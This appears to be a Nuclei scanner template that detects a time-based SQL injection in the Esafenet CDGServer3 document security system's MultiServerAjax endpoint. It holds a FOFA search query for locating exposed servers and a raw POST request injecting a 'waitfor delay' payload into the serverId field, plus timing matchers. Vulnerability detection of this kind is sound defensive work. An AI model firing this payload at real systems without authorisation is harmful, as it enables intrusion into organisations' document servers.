id: esafenet-cdgserver3-MultiServerAjax-sqli

info:
  name: 亿赛通电子文档安全管理系统 - MultiServerAjax - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - 
  metadata:
    verified: true
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
  tags: esafenet,sqli,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /CDGServer3/js/../MultiServerAjax HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        command=delServer&serverId=-1'waitfor delay '0:0:6'--

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
          - contains(header,'CDGServer3')
        condition: and